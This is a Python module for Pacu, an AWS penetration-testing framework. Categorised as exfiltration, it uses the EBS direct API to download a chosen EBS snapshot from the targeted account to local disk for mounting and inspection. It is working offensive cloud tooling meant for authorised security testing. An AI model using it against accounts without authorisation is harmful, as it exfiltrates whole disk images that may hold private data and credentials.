#!/usr/bin/env python3
"""Module for ebs_snapshot_explorer"""
import argparse
import os
from functools import reduce
from typing import Iterator
from copy import deepcopy

import boto3
import dsnap

from pacu import Main

module_info = {
    'name': 'ebs__download_snapshots',
    'author': 'Ryan Gerstenkorn ryan.gerstenkorn@rhinosecuritylabs.com',
    'category': 'EXFIL',
    'one_liner': 'Downloads EBS snapshots',
    'description': 'This module uses the EBS direct API to download specific snapshots to your computer. These can then be '
                   'mounted and explored using either docker or vagrant. For more information on how to mount these snapshots'
                   'see PLACEHOLDER.',
    'services': ['EC2'],
    'prerequisite_modules': ['ebs__enum_volumes_snapshots'],
    'arguments_to_autocomplete': ['--snapshot-id'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument(
    '--snapshot-id',
    required=False,
    help='InstanceId of instance to target'
)

# # # Called if no snapshot_id is specified when running get
# def snapshot_prompt(value: Optional[str]) -> str:
#     snapshots = [x for x in describe_snapshots(sess, OwnerIds=['self'])]
#     for i, k in enumerate(snapshots):
#         print(f"{i}) {k['SnapshotId']} (Description: {k['Description']}, Size: {k['VolumeSize']}GB)")
#     answer = prompt("Select snapshot")
#     try:
#         return snapshots[int(answer)]['SnapshotId']
#     except IndexError:
#         print(f"Invalid selection, valid inputs are 0 through {len(snapshots)-1}", file=sys.stderr)
#         return snapshot_prompt(None)

def main(args, pacu: Main):
    """Main module function, called from Pacu"""
    summary_data = {}
    print = pacu.print

    snapshot_id = parser.parse_args(args).snapshot_id
    if not snapshot_id:
        if not pacu.fetch_data(['EC2'], 'ebs__enum_volumes_snapshots', []):
            print('Failed to fetch EBS snapshot data')
            return False

    snapshots = deepcopy(pacu.get_active_session().EC2).get("Snapshots", [])
    snapshot_id = dsnap.main.snapshot_prompt(snapshot_id, snapshots)
    snapshot = filter(lambda s: s['SnapshotId'] == snapshot_id, snapshots).__next__()

    session = pacu.get_active_session()
    volume_dir = './sessions/{}/downloads/ebs/volumes'.format(session.name)
    os.makedirs(volume_dir, exist_ok=True)

    snap = dsnap.snapshot.Snapshot(snapshot_id, pacu.get_boto_session(), pacu.get_botocore_conf(region=snapshot['Region']))
    output_file = os.path.join(volume_dir, snapshot_id)
    snap.download(output_file)
    summary_data['snapshot_id'] = output_file

    return summary_data


def summary(data, pacu):
    msg = ''
    for id in data:
        path = data[id]
        msg += f" Snapshot {id} written to {path}\n"
    return msg
